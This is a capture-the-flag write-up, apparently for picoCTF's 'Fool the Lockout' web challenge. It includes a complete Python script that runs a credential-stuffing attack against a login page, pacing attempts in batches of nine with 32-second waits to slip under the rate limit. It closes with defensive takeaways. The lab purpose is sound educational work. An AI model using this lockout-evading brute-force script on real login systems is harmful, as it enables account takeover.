# Fool the Lockout

**Category:** Web Exploitation

## Solution

* The application temporarily locked login attempts after several failed requests.
* I used the provided credential list and automated login attempts with Python.
* After every **9 attempts**, the script waited **32 seconds** to allow the rate limit to reset.
* When a valid credential returned a `302` response, the script logged in and extracted the flag from the home page.

## Script

```python
import requests
import time
import re

TARGET = "http://TARGET"
BATCH_SIZE = 9
SLEEP = 32

creds = []

with open("creds-dump.txt") as f:
    for line in f:
        user, pw = line.strip().split(";")
        creds.append((user, pw))

batch = 0

for user, pw in creds:

    if batch == BATCH_SIZE:
        print("Waiting for rate limit reset...")
        time.sleep(SLEEP)
        batch = 0

    r = requests.post(
        f"{TARGET}/login",
        data={"username": user, "password": pw},
        allow_redirects=False
    )

    batch += 1

    if r.status_code == 302:
        print("SUCCESS:", user, pw)

        s = requests.Session()
        s.post(
            f"{TARGET}/login",
            data={"username": user, "password": pw}
        )

        home = s.get(TARGET)

        flag = re.search(r"picoCTF{.*}", home.text)

        if flag:
            print("Flag:", flag.group(0))

        break
```

## Concept

**Rate-Limit Bypass:** The application limited the number of login attempts within a time window, but the limit could be worked around by spacing requests and waiting for the counter to reset.

**Credential Stuffing:** Testing a list of username/password combinations against a login endpoint.

**Key Takeaway:** Authentication systems should use robust rate limiting, account lockout controls, MFA, and detection of repeated credential attacks.

**Tools:** Python, Requests
